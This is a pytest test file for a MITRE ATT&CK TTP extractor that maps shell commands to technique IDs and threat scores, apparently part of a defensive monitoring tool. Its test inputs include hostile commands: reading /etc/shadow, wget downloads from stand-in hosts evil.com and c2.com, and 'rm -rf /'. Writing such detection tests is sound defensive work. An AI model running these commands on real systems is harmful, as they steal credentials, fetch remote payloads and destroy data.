"""Tests for the MITRE ATT&CK TTP extractor."""

import pytest
from src.behavior.ttp_extractor import TTPExtractor


@pytest.fixture
def extractor():
    return TTPExtractor()


def test_extract_empty(extractor):
    assert extractor.extract([]) == []


def test_extract_whoami(extractor):
    ttps = extractor.extract(["whoami"])
    ids = [t.technique_id for t in ttps]
    assert "T1033" in ids


def test_extract_shadow(extractor):
    ttps = extractor.extract(["cat /etc/shadow"])
    ids = [t.technique_id for t in ttps]
    assert "T1003.008" in ids


def test_extract_wget(extractor):
    ttps = extractor.extract(["wget http://evil.com/payload"])
    ids = [t.technique_id for t in ttps]
    assert "T1105" in ids


def test_extract_crontab(extractor):
    ttps = extractor.extract(["crontab -e"])
    ids = [t.technique_id for t in ttps]
    assert "T1053.003" in ids


def test_no_duplicates(extractor):
    cmds = ["whoami", "id", "uname -a", "hostname"]
    ttps = extractor.extract(cmds)
    ids = [t.technique_id for t in ttps]
    assert len(ids) == len(set(ids)), "Duplicate technique IDs found"


def test_threat_score_empty(extractor):
    assert extractor.threat_score_contribution([]) == 0.0


def test_threat_score_high_impact(extractor):
    cmds = ["rm -rf /", "wget http://c2.com/rat", "crontab -e", "cat /etc/shadow"]
    score = extractor.threat_score_contribution(cmds)
    assert score > 20, f"Expected high score, got {score}"


def test_extract_as_dicts(extractor):
    dicts = extractor.extract_as_dicts(["ssh user@internal"])
    assert isinstance(dicts, list)
    if dicts:
        assert "technique_id" in dicts[0]
        assert "confidence" in dicts[0]
